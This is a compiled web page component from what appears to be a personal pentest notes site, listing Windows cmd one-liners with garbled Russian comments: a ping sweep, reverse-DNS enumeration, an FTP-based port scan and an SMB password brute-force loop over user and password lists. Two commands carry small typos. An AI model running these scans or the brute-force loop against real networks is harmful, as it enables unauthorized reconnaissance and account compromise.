import{_ as o,c as n,a as e,o as m}from"./app-BsHIgujo.js";const a={};function i(r,t){return m(),n("div",null,t[0]||(t[0]=[e("p",null,"rem Command1 & Command2 - ������ ���������� ������ rem Command1 && Command2 - ������ ������, ������ ��� �������� ���������� ������",-1),e("p",null,'rem ����� ����� ������ for /L %i in (1,1,254) do @ping 10.10.10.%i -n 1 | find "Replry"',-1),e("p",null,'rem ���������� ����� ������ for /L %i in (1,1,254) do @nslookup 10.10.10.%i 2 > nul | find "Name" && echo 10.10.10.%i',-1),e("p",null,"rem ���� ������ �� ���� ftp-������� for /L %i in (1,1,1024) do echo Checking Port %i: >> ports.txt & echo open 192.168.0.1 %i > ftp.txt & echo quit >> ftp.txt & ftp.exe -s:ftp.txt 2>>ports.txt",-1),e("p",null,"rem ���������� ������ � ������ �� ����� �� ������ � ���������� ����� �� SMB for /f %i in (user.txt) do @(for /f %j in (pass.txt) do @echo %i:%j & @net use \\10.10.10.10 %j /u:%i 2>nul && echo %i:j >>success.txt && net use \\10.10.10.10 /del)",-1)]))}const s=o(a,[["render",i],["__file","cmd.html.vue"]]),c=JSON.parse('{"path":"/dev/cmd.html","title":"","lang":"en-US","frontmatter":{},"headers":[],"git":{"updatedTime":1647284140000,"contributors":[{"name":"PaRa3uT","username":"PaRa3uT","email":"PaRa3uT.74@gmail.com","commits":1,"url":"https://github.com/PaRa3uT"}]},"filePathRelative":"dev/cmd.md"}');export{s as comp,c as data};